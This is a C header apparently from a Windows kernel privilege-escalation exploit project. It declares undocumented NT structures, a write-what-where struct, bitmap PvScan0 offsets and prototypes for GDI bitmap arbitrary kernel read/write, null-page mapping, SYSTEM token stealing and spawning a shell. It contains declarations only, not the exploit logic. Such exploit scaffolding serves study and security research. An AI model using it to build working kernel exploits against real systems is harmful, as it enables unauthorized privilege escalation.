#ifndef __PAYLOADS_H__
#define __PAYLOADS_H__
#pragma once

#include <windows.h>
#include <strsafe.h>
#include <tchar.h>

#define CMD L"C:\\windows\\system32\\cmd.exe"
#define MAX_LOG_MESSAGE 1024
#ifdef _WIN64
	#define PVSCAN0_OFFSET 0x50
#else
	#define PVSCAN0_OFFSET 0x30
#endif // _WIN64

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

#define CMD L"C:\\windows\\system32\\cmd.exe"


typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
	ProcessQuotaLimits,
	ProcessIoCounters,
	ProcessVmCounters,
	ProcessTimes,
	ProcessBasePriority,
	ProcessRaisePriority,
	ProcessDebugPort,
	ProcessExceptionPort,
	ProcessAccessToken,
	ProcessLdtInformation,
	ProcessLdtSize,
	ProcessDefaultHardErrorMode,
	ProcessIoPortHandlers,
	ProcessPooledUsageAndLimits,
	ProcessWorkingSetWatch,
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup,
	ProcessPriorityClass,
	ProcessWx86Information,
	ProcessHandleCount,
	ProcessAffinityMask,
	ProcessPriorityBoost,
	ProcessDeviceMap,
	ProcessSessionInformation,
	ProcessForegroundInformation,
	ProcessWow64Information,
	ProcessImageFileName,
	ProcessLUIDDeviceMapsEnabled,
	ProcessBreakOnTermination,
	ProcessDebugObjectHandle,
	ProcessDebugFlags,
	ProcessHandleTracing,
	ProcessIoPriority,
	ProcessExecuteFlags,
	ProcessTlsInformation,
	ProcessCookie,
	ProcessImageInformation,
	ProcessCycleTime,
	ProcessPagePriority,
	ProcessInstrumentationCallback,
	ProcessThreadStackAllocation,
	ProcessWorkingSetWatchEx,
	ProcessImageFileNameWin32,
	ProcessImageFileMapping,
	ProcessAffinityUpdateMode,
	ProcessMemoryAllocationMode,
	ProcessGroupInformation,
	ProcessTokenVirtualizationEnabled,
	ProcessConsoleHostProcess,
	ProcessWindowInformation,
	MaxProcessInfoClass
} PROCESSINFOCLASS;
/*
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;
	PVOID HotpatchInformation;
	PVOID *ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID *ProcessHeaps;

	PVOID GdiSharedHandleTable;
} PEB, *PPEB;
*/
template <class T, class NGF, int A>
struct _PEB_T
{
	union
	{
		struct
		{
			BYTE InheritedAddressSpace;
			BYTE ReadImageFileExecOptions;
			BYTE BeingDebugged;
			BYTE _SYSTEM_DEPENDENT_01;
		};
		T dummy01;
	};
	T Mutant;
	T ImageBaseAddress;
	T Ldr;
	T ProcessParameters;
	T SubSystemData;
	T ProcessHeap;
	T FastPebLock;
	T _SYSTEM_DEPENDENT_02;
	T _SYSTEM_DEPENDENT_03;
	T _SYSTEM_DEPENDENT_04;
	union
	{
		T KernelCallbackTable;
		T UserSharedInfoPtr;
	};
	DWORD SystemReserved;
	DWORD _SYSTEM_DEPENDENT_05;
	T _SYSTEM_DEPENDENT_06;
	T TlsExpansionCounter;
	T TlsBitmap;
	DWORD TlsBitmapBits[2];
	T ReadOnlySharedMemoryBase;
	T _SYSTEM_DEPENDENT_07;
	T ReadOnlyStaticServerData;
	T AnsiCodePageData;
	T OemCodePageData;
	T UnicodeCaseTableData;
	DWORD NumberOfProcessors;
	union
	{
		DWORD NtGlobalFlag;
		NGF dummy02;
	};
	LARGE_INTEGER CriticalSectionTimeout;
	T HeapSegmentReserve;
	T HeapSegmentCommit;
	T HeapDeCommitTotalFreeThreshold;
	T HeapDeCommitFreeBlockThreshold;
	DWORD NumberOfHeaps;
	DWORD MaximumNumberOfHeaps;
	T ProcessHeaps;

	//FULL PEB not needed
	T GdiSharedHandleTable;
/*
	T ProcessStarterHelper;
	T GdiDCAttributeList;
	T LoaderLock;
	DWORD OSMajorVersion;
	DWORD OSMinorVersion;
	WORD OSBuildNumber;
	WORD OSCSDVersion;
	DWORD OSPlatformId;
	DWORD ImageSubsystem;
	DWORD ImageSubsystemMajorVersion;
	T ImageSubsystemMinorVersion;
	union
	{
	T ImageProcessAffinityMask;
	T ActiveProcessAffinityMask;
	};
	T GdiHandleBuffer[A];
	T PostProcessInitRoutine;
	T TlsExpansionBitmap;
	DWORD TlsExpansionBitmapBits[32];
	T SessionId;
	ULARGE_INTEGER AppCompatFlags;
	ULARGE_INTEGER AppCompatFlagsUser;
	T pShimData;
	T AppCompatInfo;
	UNICODE_STRING_T<T> CSDVersion;
	T ActivationContextData;
	T ProcessAssemblyStorageMap;
	T SystemDefaultActivationContextData;
	T SystemAssemblyStorageMap;
	T MinimumStackCommit;
*/
};

typedef _PEB_T<DWORD, DWORD64, 34> PEB32, *PPEB32;
typedef _PEB_T<DWORD64, DWORD, 30> PEB64, *PPEB64;
/*
#ifdef _WIN64
typedef PEB64 PEB_CURRENT;
#else
typedef PEB32 PEB_CURRENT;
#endif
*/

typedef struct _PROCESS_BASIC_INFORMATION
{
	LONG ExitStatus;
	PVOID PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR ParentProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;
/*typedef struct
{
DWORD ExitStatus;
DWORD PebBaseAddress;
DWORD AffinityMask;
DWORD BasePriority;
ULONG UniqueProcessId;
ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
*/


typedef struct _GDICELL {
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	LPVOID pUserAddress;
} GDICELL, *PGDICELL;


typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

typedef struct _PROCESS_ACCESS_TOKEN {
	HANDLE Token;
	HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

typedef struct _EPROCESS {
	UCHAR NotNeeded1[0x26C];
	union {
		ULONG Flags2;
		struct {
			ULONG JobNotReallyActive : 1;
			ULONG AccountingFolded : 1;
			ULONG NewProcessReported : 1;
			ULONG ExitProcessReported : 1;
			ULONG ReportCommitChanges : 1;
			ULONG LastReportMemory : 1;
			ULONG ReportPhysicalPageChanges : 1;
			ULONG HandleTableRundown : 1;
			ULONG NeedsHandleRundown : 1;
			ULONG RefTraceEnabled : 1;
			ULONG NumaAware : 1;
			ULONG ProtectedProcess : 1;
			ULONG DefaultPagePriority : 3;
			ULONG PrimaryTokenFrozen : 1;
			ULONG ProcessVerifierTarget : 1;
			ULONG StackRandomizationDisabled : 1;
			ULONG AffinityPermanent : 1;
			ULONG AffinityUpdateEnable : 1;
			ULONG PropagateNode : 1;
			ULONG ExplicitAffinity : 1;
		};
	};
	UCHAR NotNeeded2[0x50];
} EPROCESS, *PEPROCESS;


typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength);



typedef NTSTATUS(NTAPI *NtQueryInformationProcess_t)(
	HANDLE	ProcessHandle,
	DWORD	ProcessInformationClass,
	PVOID	ProcessInformation,
	DWORD	ProcessInformationLength,
	PDWORD	ReturnLength
	);

typedef NTSTATUS(WINAPI *NtQueryIntervalProfilet_t)(
	IN ULONG   ProfileSource,
	OUT PULONG Interval);

typedef NTSTATUS(WINAPI *PsLookupProcessByProcessId_t)(
	IN HANDLE ProcessId,
	OUT PVOID Process);

typedef NTSTATUS(WINAPI *ZwOpenProcessToken_t)(
	IN HANDLE      ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	OUT PHANDLE    TokenHandle);

typedef NTSTATUS(WINAPI *ZwSetInformationProcess_t)(
	IN HANDLE ProcessHandle,
	IN ULONG  ProcessInformationClass,
	IN PVOID  ProcessInformation,
	IN ULONG  ProcessInformationLength);

#ifdef _WIN64
typedef NTSTATUS(NTAPI *NtAllocateVirtualMemory_t)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN ULONG                ZeroBits,
	IN OUT PULONG64           RegionSize,
	IN ULONG                AllocationType,
	IN ULONG                Protect);
#else
typedef NTSTATUS(WINAPI *NtAllocateVirtualMemory_t)(
	IN HANDLE     ProcessHandle,
	IN OUT PVOID  *BaseAddress,
	IN ULONG      ZeroBits,
	IN OUT PULONG AllocationSize,
	IN ULONG      AllocationType,
	IN ULONG      Protect);
#endif // DEBUG




typedef NTSTATUS(WINAPI *NtMapUserPhysicalPages_t)(
	IN PVOID          VirtualAddress,
	IN ULONG_PTR      NumberOfPages,
	IN OUT PULONG_PTR UserPfnArray);

typedef struct _LeakBitmapInfo {
	HBITMAP hBitmap;
	PUCHAR pBitmapPvScan0;
} LeakBitmapInfo, *pLeakBitmapInfo;



BOOL		LogMessage(LEVEL Level, LPCTSTR Format, ...);
LONG		BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen);
LONG		BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen);

FARPROC		GetEProcess(LPCSTR PsInitial);

#ifdef _WIN64
ULONG64		GetPvScan0(PPEB64 peb, HBITMAP hBitmap);
PPEB64		GetPEB(HANDLE hProcess);
PPEB64		GetProcessPEB(HANDLE hProcess, DWORD dwPID);
#else
ULONG		GetPvScan0(PPEB32 peb, HBITMAP hBitmap);
PPEB32		GetPEB(HANDLE hProcess);
PPEB32		GetProcessPEB(HANDLE hProcess, DWORD dwPID);
#endif // _WIN64


void		PopShell();
FARPROC	WINAPI KernelSymbolInfo(LPCSTR lpSymbolName);
//LeakBitmapInfo GDILeakBitmap(HANDLE hProcess, PPEB peb, DWORD dwOffsetToPvScan0);
void StealToken(HBITMAP ManagerBitmap, HBITMAP WorkerBitmap, DWORD dwPID);
BOOL MapNullPage();

#endif // !__PAYLOADS_H__


